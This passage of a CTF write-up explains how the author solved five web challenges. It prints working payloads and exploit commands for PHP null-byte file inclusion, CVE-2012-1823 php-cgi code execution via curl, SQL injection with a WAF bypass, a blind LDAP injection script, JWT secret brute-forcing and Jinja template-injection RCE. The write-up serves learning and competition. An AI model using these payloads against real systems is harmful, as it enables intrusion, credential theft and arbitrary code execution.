**Resources:**
* Flask: https://en.wikipedia.org/wiki/Flask_(web_framework)
* Flask RCE Debug Mode: http://ghostlulz.com/flask-rce-debug-mode/

## Bite
Want to learn about binary units of information? Check out the "Bite of Knowledge" website!

Connect here:\
http://jh2i.com:50010

**`flag{lfi_just_needed_a_null_byte}`**

**Solution:** With the challenge we get a url for a website:

![](assets//images//bite_1.png)

the site is about binary units, a possible clue for the exploit we need to use, it seems we can search the site or navigate to other pages, by looking at the url we can see that it uses a parameter called page for picking the resource to display, so the format is:

`http://jh2i.com:50010/index.php?page=<resource>`

we possibly have a local file inclusion vulnerability (LFI) here, as I explained in my writeup for nahamCon CTF:

>  PHP allows the inclusion of files from the server as parameters in order to extend the functionality of the script or to use code from other files, but if the script is not sanitizing the input as needed (filtering out sensitive files) an attacker can include any arbitrary file on the web server or at least use what's not filtered to his advantage

Let's first try to include the PHP file itself, this will create some kind of a loop where this file is included again and again and will probably cause the browser to crash...but it's a good indicator that we have an LFI vulnerability without forcing us to use directory traversal, navigating to `/index.php?page=index.php` gives us:

![](assets//images//bite_2.png)

index.php.php? it's seems that the PHP file includes a resource with a name matching the parameter given appended with .php, lets try `/index.php?page=index` :

![](assets//images//bite_3.png)

It worked! so we know that we have an LFI vulnerability where the parameter given is appended to a php extension, appending a string to the user input is a common defense mechanism against arbitrary file inclusion as we are limited only to a small scope of files, hopefully only ones that are safe to display, but there are several ways to go around this.

In older versions of PHP by adding a null byte at the end of the parameter we can terminate the string, a null byte or null character is a character with an hex code of `\x00`, this character signifies the end of a string in C and as such strings in C are often called null-terminated strings, because PHP uses C functions for filesystem related operations adding a null byte in the parameter will cause the C function to only consider the string before the null byte.

With that in mind let's check if we can use a null byte to display an arbitrary file, to mix things we'll try to include `/etc/passwd`, this file exists in all linux servers and is commonly accessible by all the users in the system (web applications are considered as users in linux), as such it's common to display the content of this file in order to prove access to a server or an exploit (proof of concept), we can represent a null byte in url encoding using `%00`, navigating to `/index.php?page=/etc/passwd%00` gives us:

![](assets//images//bite_4.png)

We can use null bytes!...but where is the flag located?\
At this point I tried a lot of possible locations for the flag until I discovered that it's located in the root directory in a file called `file.txt` navigating to `/index.php?page=/flag.txt%00` gives us the flag:

![](assets//images//bite_5.png)

**Resources:**
* File Inclusion Vulnerabilities: https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/
* Payload all the things - File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
* Null byte: https://en.wikipedia.org/wiki/Null_character
* Null byte issues in PHP: https://www.php.net/manual/en/security.filesystem.nullbytes.php

## GI Joe
The real American hero!

Connect here:\
http://jh2i.com:50008

**Post-CTF Writeup**\
**`flag{old_but_gold_attacks_with_cgi_joe}`**

**Solution:** With the challenge we get a url to a website about G.I joe's movies called See GI Joe:

![](assets//images//gi_joe_1.png)

By the name of the challenge we can assume it has something to do with Common Gateway Interface or CGI (See GI), Common Gateway Interface are interface specification for communication between a web server (which runs the website) and other programs on the server, this allows webserver to execute commands on the server (such as querying a database), and is mostly used to generate webpages dynamically, this type of communication is handled by CGI scripts which are often stored in a directory called `cgi-bin` in the root directory of the web server.

Looking around in the website I couldn't find any interesting thing, but by looking at the headers of the server responses using the inspect tool I discovered that the website is using PHP version 5.4.1 and Apache version 2.4.25, this are quite old versions of both PHP (current version is 7.3) and Apache (current version is 2.4.43) so I googled `php 5.4.1 exploit cgi` and discovered this [site](https://www.zero-day.cz/database/337/), according to it there is a vulnerability in this version of PHP which allows us to execute arbitrary code on the server, this vulnerability is often referred to by CVE-2012-1823 (or by CVE-2012-2311 because of later a discovery related to this vulnerability).

In more details when providing vulnerable website with a value with no parameter (lacks of the `=` symbol) the value is interpreted as options for the php-cgi program which handles communication with the web server related to PHP, the options are listed in the man page linked in the resources, so for example by using the -s flag we can output the source code for a PHP file and so by adding `/?-s` to the URI for a PHP file located on a vulnerable server we can view the source code of the file, let's try it on the index page which is a PHP file, by navigating to `/index.php?-s` we get:

![](assets//images//gi_joe_2.png)

It worked! and we now know that the flag is in a file called flag.txt in the root directory of the server, as I mentioned before this vulnerability allows us to execute commands on the server, this can be done by using the -d option, this option give us the ability to change and define INI entries, or in other words change the configuration file of PHP, in order to run commands we need to change the option `auto_prepend_file` to `php://input`, this will force PHP to parse the HTTP request and include the output in the response, also we need to change the option `allow_url_include` to `1` to allow usage of `php://input`, so by navigating to `/?-d allow_url_include=1 -d auto_prepend_file=php://input` and adding to the HTTP request a PHP code to execute commands on the system `<?php system(<command>) ?>` we can achieve arbitrary code execution on the server.

let's try doing that to view the flag, we can use cURL with the -i flag to include the HTTP headers and --data-binary flag to add the PHP code to the HTTP request, in the PHP code we'll use `cat /flag.txt` to output the content of the file, the command is:

`curl -i --data-binary "<?php system(\"cat /flag.txt \") ?>" "http://jh2i.com:50008/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"`

and by executing this command we get the flag:

![](assets//images//gi_joe_3.png)

**Resources:**
* Common Gateway Interface: https://en.wikipedia.org/wiki/Common_Gateway_Interface
* CVE-2012-1823: https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-1823
* CVE-2012-2311: https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2012-2311
* a detailed explanation on CVE-2012-1823: https://pentesterlab.com/exercises/cve-2012-1823/course
* man page for php-cgi: https://www.systutorials.com/docs/linux/man/1-php-cgi/

## Waffle Land
We got hacked, but our waffles are now safe after we mitigated the vulnerability.

Connect here:\
http://jh2i.com:50024

**`flag{check_your_WAF_rules}`**

**Solution:** With the challenge we get a url to a website about waffles:

![](assets//images//waffle_land_1.png)

There seems to be only two functionalities to this webpage, searching using the search bar or signing in using a username and a password, as we don't have any credentials let's try to fiddle with the search option. The search option returns only the waffles that has the search parameter in them, trying to insert the character `'` gives us an error message:

![](assets//images//waffle_land_2.png)

This gives us information about two things, first we know now that the search option uses SQL to filter data, SQL is a language designed for managing and querying databases (with SQL it is common to think of databases as tables with rows of data and columns of attributes), in this case a SQL query is used to select all the products with the having a value in the name attribute similar to the input given, second we know that the web server uses SQLite3 management system, this has some influence on the version of SQL used and on the operations we can use or exploit.

A common attack against SQL systems is using SQL injection or SQLi, computers can't differentiate between data and commands and as such it's sometime possible to inject commands where data is requested, for example we can search for `' limit 1 ---` and this will cause the SQL management system if it's vulnerable to SQLi to execute the following query:

`select * from product where name like '' limit 1`

this query returns the first row of data in the product table, this will be executed because we closed the quotations and added `-- -` at the end which signifies that the rest of the string is a comment.
To prevent this attack there are systems in place to filter (sanitize) the input given, one of those is a Web Application Firewall or WAF, this type of systems monitor the HTTP traffic of a web server and prevent attacks such as SQLi by blocking suspicious traffic.

Let's first check if we have SQLi to begin with, using the search parameter in the example above gives us the following:

![](assets//images//waffle_land_3.png)

Seems like we can use SQLi, now let's try to view the users table in order to sign in to the site, for that we need to add data from the users table to the output of the query, we can use union for that but it will only work if the number of attributes in the the product table and the number of attributes of the data added is the same, let's start with finding the number of attributes in the product table using `' order by n -- -`, adding this to the query will sort the data according to the n'th attribute, and if n is bigger than the number of attributes in this table the query will cause an error, doing so we can discover that the number of attributes in the product table (the table of waffles) is 5.

With the number of attributes in mind we can try adding data, first we'll try using `' union select 1,2,3,4,5 -- -` this will add the row `1,2,3,4,5` to the output of the query, by doing so we get the following:

![](assets//images//waffle_land_4.png)

It appears that the web server is blocking this search, so we might be working against a WAF after all (fitting the theme of this challenge), trying to work around the WAF I discovered that the WAF is only filtering searches with the string ` union select` so a simple workaround I discovered is using `/**/union/**/select` instead, the symbol `/*` signifies the start of a comment and the symbol `*/` the end of a comment so using `/**/` doesn't change the query's meaning but could possibly help us pass through the WAF, using  `'/**/union/**/select 1,2,3,4,5 -- -` gives us the following:

![](assets//images//waffle_land_5.png)

 So now we have a way to add data to the output, we still need to get data about the users so we need to know the name of table which stores users data and the attributes of the table, checking if we can select data from a table named `users` by using `'/**/union/**/select 1,2,3,4,5 from users -- -` gives us an error but by checking for `user` seems to work so we can guess there is a table named `user` in the database, we need to get usernames and passwords from this table, I discovered through trial and error that there attributes named `password` and `username` so we can search for the following to get the data we need from this table:

`' and 0=1/**/union/**/select/**/1,username,password,4,5 from user ---`

the query executed will be:

`select * from product where name like '' and 0=1/**/union/**/select/**/1,username,password,4,5 from user`

this will first select the data from the product table and filter only the data that satisfy the condition 0=1, so the query will filter all the data from the product table, then it adds the data in the username and the password columns of the table user and uses number 1,4 and 5 to pad the data so we can use union, from the search we get the password and the username for admin:

![](assets//images//waffle_land_6.png)

We can now login as admin and receive the flag:

![](assets//images//waffle_land_7.png)

**Resources:**
* SQL: https://en.wikipedia.org/wiki/SQL
* SQLite: https://en.wikipedia.org/wiki/SQLite
* SQL injection (SQLi): https://en.wikipedia.org/wiki/SQL_injection
* Web Application Firewall (WAF): https://en.wikipedia.org/wiki/Web_application_firewall
* SQLi cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Lightweight Contact Book
Lookup the contact details of any of our employees!

Connect here:\
http://jh2i.com:50019

**`flag{kids_please_sanitize_your_inputs}`**

**Solution:** We again receive a url to a website with the challenge which seems...empty

![](assets//images//lightweight_1.png)

We have two options (again), to search and to login using a username and a password, but this time we also have the option to recover a user's password:

![](assets//images//lightweight_2.png)

We can try some common usernames, all of them seems to give us the message "Sorry, this functionality is currently unavailable" except for the username `administrator` which gives us the following:

![](assets//images//lightweight_3.png)

Okay so we have a username that is administrator...what's next? after a bit of fuzzing the search bar I got an error message:

![](assets//images//lightweight_4.png)

by googling the error message I discovered that this website using a protocol called LDAP for the search, LDAP or Lightweight Directory Access Protocol is a protocol for accessing directory service over the internet (directory service is a shared information infrastructure, can be thought of as a database for this challenge), in this protocol the symbol `*` stands for a wildcard and filtering is done using `(<attribute>=<value>)` and filters can be appended together. By searching for `*` we can view the display name and the email of employees, one that stand out is the employee with the display name `Administrator User`, by trying to search for `Admin*` we can see that only the row with this employee is left, so we can assume that the statement used by the search option is `(name=<search input>)` and that we need to discover the description for the employee with the name `Administrator User`.

A common attack against LDAP is using LDAP injection which is very similar to SQL injection, a simple example for LDAP injection is to search for `*)(mail=administrator@hacktivitycon*` the statement that will be executed by our assumption is:

 `(name=*)(email=administrator@hacktivitycon.local)`

and only the employee(s) with this email will be displayed, trying that gives us:

 ![](assets//images//lightweight_5.png)

and it seems that we can use LDAP injection, so we want to get the password stores in  the description of the administrator but we cannot display it so we can do something similar to blind SQL injection, by search for `Admin*)(description=<string>*` and changing the value of string character by character, we have two options:
* The value is the start of password and the information about the Administrator will be displayed as it matches both of the filters.
* The value is not the start of the password and information about the Administrator will not be displayed because it doesn't match the second filter.

we can start with an empty string an go through all the characters trying to append the character to the string until information about the Admin is displayed, at this point we know that the string is the start of the password and we can try to add another character to the string by again going through all the characters and so on until we can no longer add characters, so I wrote a python script to do that:

 ```python
 import urllib.parse, urllib.request
from string import printable

password = ''
while 1:
	for c in printable:
		query = 'Admin*)(description={}*'.format(password + c)
		url = 'http://jh2i.com:50019/?search=' + urllib.parse.quote(query)
		response = urllib.request.urlopen(url).read()
		if b'Admin' in response:
			password += c
			print(password)
			break
 ```

by running the script we get the password:

![](assets//images//lightweight_6.png)

and we can connect with the username `administrator` and the password `very_secure_hacktivity_pass` to receive the flag:

![](assets//images//lightweight_7.png)

**Resources:**
* Lightweight Directory Access Protocol (LDAP): https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol
* LDAP injection: https://www.synopsys.com/glossary/what-is-ldap-injection.html
* LDAP injection cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection

## Template Shack
Check out the coolest web templates online!

Connect here:\
http://jh2i.com:50023

**Post-CTF Writeup**\
**`flag{easy_jinja_SSTI_RCE}`**

**Solution:** With the challenge we get a url for a webpage about web templates:

![](assets//images//template_shack_1.png)

By the name of the challenge we can guess we need to use Server-Side Template Injection or SSTI.\
This vulnerability is caused due to the nature of template engine, template engines are programs designed to embed dynamic data into static template files, a good example for this kind of templates are actually the one shown in this site, but using templates could allow attackers to inject template code to the website, because the template engine can't distinguish between the intended code and data unsafe embedding of user input without sanitization could result with user input interpreted as code and parsed by the engine,  allowing attackers to reveal private information and even run arbitrary code on the server.

But, this page doesn't seems to be vulnerable to SSTI, we could guess by the design and HTTP response's headers that this site is running jinja as the template engine with flask as the framework.\
After the CTF ended I discovered that there is an SSTI vulnerability...in the admin page, so we need to sign in as admin first, looking around the website some more we can see that the site uses cookies to save user state, as I explained in a previous writeup:

>...because HTTP connection is stateless (doesn't save the state of the connection server-side) and because sometimes the server needs to know who is the user in a session it saves cookies on the computer of the user, cookies are data which is most of the time encrypted and sent with HTTP requests to helps the server recognize the user

in our case the cookie is actually a JSON Web Token or JWT, JWT is an internet standard for creating signed information and is used mostly for authentication, a token composes of three parts separated by a dot:
*  An Header, this header identifies the algorithm used to generate the signature (the third part of the token), this part is base64 encoded
*  A Payload, contains the set of claims, or in other words the actual signed data, this part is also base64 encoded
*  A signature, this part is used to validate the authenticity of the token, the signature is created by appending the previous two parts to a secret and then using the signing scheme or the message authentication code system listed in the header to encrypt the data.

Let's look at our token using a tool called jwt_tool (listed in the resources):

![](assets//images//template_shack_2.png)

We have only one claim in the token's payload and it's for the username, so we need to change the value of the claim to admin, there are multiple ways to modify a JWT but bruteforcing the secret key using a dictionary worked for me, we could do that using the same tool and a public dictionary for passwords called rockyou.txt with the following command:

`python3 jwt_tool.py -C eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y -d rockyou.txt`


By doing so we get the secret key `supersecret`, and using the same tool and the secret key we can modify the token so that the username is admin, the modified token is:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H+/2q+Vo32g4mLpkEcajK0H7I`

and by changing the cookie stored for the website to this token we get signed in as admin:

![](assets//images//template_shack_3.png)

Checking out the admin page we see that it uses the first template shown on the index page:

![](assets//images//template_shack_4.png)

so we now might be able to use SSTI, there are only two pages available two us, the charts page and the tables page in the side toolbar, both show a 404 error:

![](assets//images//template_shack_5.png)

After a bit of fuzzing I discovered that we can add template code to the 404 error page by changing the URL of the page to `http://jh2i.com:50023/admin/<code>`, for example by navigating to `http://jh2i.com:50023/admin/{{7*7}}` we get:

![](assets//images//template_shack_6.png)

so now that we can use SSTI we can get RCE using the following payload:

`{{config.__class__.__init__.__globals__['os'].popen('<command>').read()}}`

I will not go to details about why it works because this writeup is long as it is but basically the part `config.__class__.__init__.__globals__` returns a list global variables of the class which config is an instance of, one of those is the module os, using the module os we can create a new process with popen which will execute a command and using read() will return the output of the command, first let's see what we have in our working directory:

![](assets//images//template_shack_7.png)

it worked! and there is a file called flag.txt in this directory reading it using `cat flag.txt` gives us the flag:

![](assets//images//template_shack_8.png)

**Resources:**
* Server Side Template Injection (SSTI): https://portswigger.net/research/server-side-template-injection
* Template engine: https://en.wikipedia.org/wiki/Template_processor
* SSTI cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
* JSON Web Tokens: https://en.wikipedia.org/wiki/JSON_Web_Token
* JSON Web Tokens cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
* jwt_tool: https://github.com/ticarpi/jwt_tool
